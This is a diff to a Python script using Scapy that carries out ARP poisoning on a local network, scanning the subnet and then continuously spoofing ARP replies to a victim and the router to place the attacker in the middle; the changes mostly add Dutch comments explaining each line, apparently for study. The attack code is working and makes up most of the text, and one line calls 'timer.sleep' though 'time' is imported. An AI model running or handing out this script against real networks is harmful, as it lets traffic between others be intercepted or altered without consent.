@@ -4,9 +4,9 @@ import threading
 import time
 
 def arp_poison(target_ip, target_mac, spoof_ip):
-    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    while True:
-        send(packet, verbose=0)
+    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) # 'op' specifiëert het type ARP boodschap, 'op=2' stuurt een ARP reply (ook zonder dat er een ARP request is geweest)
+    while True: #pdst = protocol destinatian; hwdst = hardware destination; psrc = protocol source --> dit is het IP adres waarvan de data lijkt te komen voor de target
+        send(packet, verbose=0) #dit verzend het 'poison packet' op het netwerk
         time.sleep(2)  # Repeat to keep ARP table poisoned
 
 def get_local_ip_and_subnet():
@@ -16,7 +16,7 @@ def get_local_ip_and_subnet():
 
 def get_ip_and_mac():
     local_ip = get_local_ip_and_subnet()
-    subnet = '.'.join(local_ip.split('.')[:-1]) + '.1/24'
+    subnet = '.'.join(local_ip.split('.')[:-1]) + '.1/24' #deze lijn doet een ARP scan over het hele lokale netwerk
 
     arp_request = ARP(pdst=subnet)
     ether = Ether(dst='ff:ff:ff:ff:ff:ff')
@@ -24,9 +24,9 @@ def get_ip_and_mac():
 
     result = srp(packet, timeout=3, verbose=False)[0]
 
-    for sent, received in result:
-        if received.psrc != local_ip:  # Skip responses from the local machine
-            return received.psrc, received.hwsrc
+    for sent, received in result: #loop over alle ontvangen packets
+        if received.psrc != local_ip:  # deze lijn zorgt ervoor dat de packets die van zichzelf komen genegeerd worden
+            return received.psrc, received.hwsrc #psrc = protocol source (= IP adres); hwsrc = hardware source (=MAC adres)
     
     print("Failed, not connected")
     return None, None
@@ -39,10 +39,10 @@ router_ip, router_mac = get_ip_and_mac()
 try:
     print("Starting ARP poisoning...")
     # Start poisoning threads
-    threading.Thread(target=arp_poison, args=(victim_ip, victim_mac, router_ip)).start()
-    threading.Thread(target=arp_poison, args=(router_ip, router_mac, victim_ip)).start()
-    while True:
+    threading.Thread(target=arp_poison, args=(victim_ip, victim_mac, router_ip)).start() #deze thread stuurt constant ARP packets naar de victim's device waarin staat dat het MAC adres van de attacker bij de IP van de router hoort
+    threading.Thread(target=arp_poison, args=(router_ip, router_mac, victim_ip)).start() #deze thread stuurt constant ARP packets naar de router waarin staat dat het MAC adres van de attacker bij het IP adres van de victim hoort
+    while True: #deze loop zorgt ervoor dat de threads blijven runnen op de achtergrond
         timer.sleep(10)
 except KeyboardInterrupt:
-    print("stopped")
+    print("stopped by keyboard")
 
